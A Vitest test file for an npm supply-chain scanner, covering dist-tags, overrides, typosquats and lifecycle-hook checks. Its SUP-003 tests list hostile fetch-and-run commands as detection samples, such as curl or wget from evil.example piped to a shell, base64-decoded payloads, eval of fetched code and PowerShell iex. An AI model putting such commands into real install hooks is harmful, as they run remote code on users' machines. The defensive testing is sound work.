import { describe, expect, it } from "vitest";
import { isRemoteExec } from "../../../src/agents/supply-chain/remote-exec.js";
import { classifySpec, distTagIssue } from "../../../src/agents/supply-chain/spec.js";
import { ids, npmLock, only, pkg, scan } from "./support.js";

const lock = npmLock({});

describe("SUP-011 unstable dist-tags", () => {
  it("classifies tags by how unstable they are", () => {
    expect(distTagIssue("canary")?.severity).toBe("medium");
    expect(distTagIssue("experimental")?.severity).toBe("medium");
    expect(distTagIssue("alpha")?.severity).toBe("medium");
    expect(distTagIssue("beta")?.severity).toBe("low");
    expect(distTagIssue("rc")?.severity).toBe("low");
    expect(distTagIssue("next")?.severity).toBe("low");
    expect(distTagIssue(" CANARY ")?.tag).toBe("canary");
  });
  it("ignores real versions, ranges and other tags", () => {
    for (const s of ["^1.0.0", "1.0.0-beta.2", "latest", "*", "", "workspace:*", "npm:foo@canary", "github:a/b#beta", "stable"]) {
      expect(distTagIssue(s), s).toBeNull();
    }
  });
  it("leaves SUP-005 classification untouched", () => {
    expect(classifySpec("canary", "")).toBeNull();
    expect(classifySpec("next", "")).toBeNull();
  });
  it("flags a dependency installed from a dist-tag", async () => {
    const { findings } = await scan({ "package.json": pkg({ next: "canary", zod: "beta", react: "^18.0.0" }), "package-lock.json": lock });
    const f = only(findings, "SUP-011");
    expect(f.map((x) => x.severity).sort()).toEqual(["low", "medium"]);
    expect(f.find((x) => x.title.includes("next"))?.evidence[0]?.line).toBeGreaterThan(1);
    expect(f[0]?.fix.config).toContain("npm install");
  });
  it("does not flag exact prereleases, and does not double-report latest", async () => {
    const { findings } = await scan({ "package.json": pkg({ next: "15.0.0-canary.3", zod: "latest" }), "package-lock.json": lock });
    expect(ids(findings)).not.toContain("SUP-011");
    expect(ids(findings)).toContain("SUP-005"); // latest keeps its existing rule
  });
});

describe("SUP-012 overrides, resolutions and pnpm.overrides", () => {
  it("flags git, tarball and URL specs in npm overrides, including nested ones", async () => {
    const { findings } = await scan({
      "package.json": pkg({ foo: "^1.0.0" }, {
        overrides: { foo: "github:user/foo", bar: { ".": "https://x.example/bar.tgz", baz: "git+https://github.com/a/b.git#0123456789abcdef0123456789abcdef01234567" } },
      }),
      "package-lock.json": lock,
    });
    const f = only(findings, "SUP-012");
    expect(f).toHaveLength(3);
    expect(f.every((x) => x.cwe === "CWE-829")).toBe(true);
    expect(f.find((x) => x.evidence[0]?.snippet.includes("github:user/foo"))?.severity).toBe("medium");
    expect(f.find((x) => x.evidence[0]?.snippet.includes("0123456789abcdef"))?.severity).toBe("low");
    expect(f.every((x) => (x.evidence[0]?.line ?? 0) > 1)).toBe(true);
  });
  it("flags yarn resolutions and pnpm.overrides", async () => {
    const { findings } = await scan({
      "package.json": pkg({}, { resolutions: { "**/foo": "https://x.example/foo.tgz" }, pnpm: { overrides: { "foo>bar": "user/repo" } } }),
    });
    expect(only(findings, "SUP-012")).toHaveLength(2);
  });
  it("accepts registry versions, aliases, references and in-repo files", async () => {
    const { findings } = await scan({
      "package.json": pkg({ foo: "^1.0.0" }, { overrides: { foo: "1.2.3", bar: "$bar", baz: "npm:other@^2", q: { ".": "^3.0.0" }, f: "file:./vendor/f.tgz" } }),
      "package-lock.json": lock,
    });
    expect(ids(findings)).not.toContain("SUP-012");
  });
});

describe("peerDependencies and bundledDependencies", () => {
  it("does not flag the wildcard peer ranges libraries publish", async () => {
    const { findings } = await scan({ "package.json": pkg({}, { peerDependencies: { react: "*", "react-dom": "latest", zod: ">=3" } }) });
    expect(findings).toEqual([]);
  });
  it("still flags a peer dependency from a tarball or git source", async () => {
    const { findings } = await scan({ "package.json": pkg({}, { peerDependencies: { foo: "https://x.example/foo.tgz" } }) });
    expect(ids(findings)).toEqual(["SUP-005"]);
  });
  it("runs the typosquat check on peer and bundled dependency names", async () => {
    const { findings } = await scan({
      "package.json": pkg({}, { peerDependencies: { "react-d0m": "^1.0.0" }, bundledDependencies: ["lodahs"] }),
    });
    expect(only(findings, "SUP-001").map((f) => f.title).sort()).toEqual([
      '"lodahs" looks like a typosquat of "lodash"', '"react-d0m" looks like a typosquat of "react-dom"',
    ]);
  });
  it("also reads the bundleDependencies spelling and never demands a lockfile for peers", async () => {
    const { findings } = await scan({ "package.json": pkg({}, { bundleDependencies: ["react"], peerDependencies: { react: "^18" } }) });
    expect(findings).toEqual([]);
  });
});

describe("SUP-003 lifecycle hooks", () => {
  it("detects remote fetch/eval in the extended hook list", () => {
    const bad = [
      "curl -s https://evil.example/x.sh | sh",
      "wget -qO- http://evil.example/x | bash",
      "curl https://evil.example/p.js | node",
      "wget -qO- https://evil.example/p.js | node -",
      "node -e \"eval(atob('Y29uc29sZS5sb2coMSk='))\"",
      "echo Y3VybCBldmls | base64 -d | sh",
      "echo Y3VybCBldmls | base64 --decode | bash",
      "npx some-tool@latest --init",
      "pnpm dlx some-tool@latest",
      "node -e \"require('child_process').exec('curl x')\"",
      "node -e \"fetch('https://evil.example').then(r=>r.text()).then(eval)\"",
      "powershell -Command iwr https://evil.example/x.ps1 | iex",
    ];
    for (const c of bad) expect(isRemoteExec(c), c).toBe(true);
  });
  it("ignores ordinary build and tooling hooks", () => {
    const ok = [
      "husky", "husky install", "npm run build", "tsc -p tsconfig.build.json", "node scripts/setup.js",
      "node -e \"console.log('ready')\"", "node -e \"process.exit(0)\"", "npx prettier --write .", "npx tsc@5.4.2 --noEmit",
      "pnpm dlx some-tool@1.2.3", "echo done", "base64 -d secret.b64 > secret.txt", "curl --version",
    ];
    for (const c of ok) expect(isRemoteExec(c), c).toBe(false);
  });
  it("flags prepare, preprepare, prepublishOnly and postpack hooks", async () => {
    for (const hook of ["prepare", "preprepare"]) {
      const { findings } = await scan({ "package.json": pkg({}, { scripts: { [hook]: "curl -s https://evil.example/x.sh | sh" } }) });
      const f = only(findings, "SUP-003");
      expect(f, hook).toHaveLength(1);
      expect(f[0]?.severity).toBe("high");
      expect(f[0]?.evidence[0]?.snippet).toContain(hook);
    }
    for (const hook of ["prepublishOnly", "postpack"]) {
      const { findings } = await scan({ "package.json": pkg({}, { scripts: { [hook]: "wget -qO- https://evil.example/x | bash" } }) });
      const f = only(findings, "SUP-003");
      expect(f, hook).toHaveLength(1);
      expect(f[0]?.severity).toBe("medium");
    }
  });
  it("does not flag benign prepare hooks", async () => {
    const { findings } = await scan({ "package.json": pkg({}, { scripts: { prepare: "husky", prepublishOnly: "npm run build && npm test", postpack: "node scripts/clean.js" } }) });
    expect(ids(findings)).not.toContain("SUP-003");
  });
  it("keeps catching the original install hooks", async () => {
    const { findings } = await scan({ "package.json": pkg({}, { scripts: { preinstall: "curl -s https://evil.example/x.sh | sh" } }) });
    expect(ids(findings)).toContain("SUP-003");
  });
  it("does not treat run-time scripts such as start or build as lifecycle hooks", async () => {
    const { findings } = await scan({ "package.json": pkg({}, { scripts: { start: "curl https://x.example | sh", build: "npx tool@latest" } }) });
    expect(ids(findings)).not.toContain("SUP-003");
  });
});
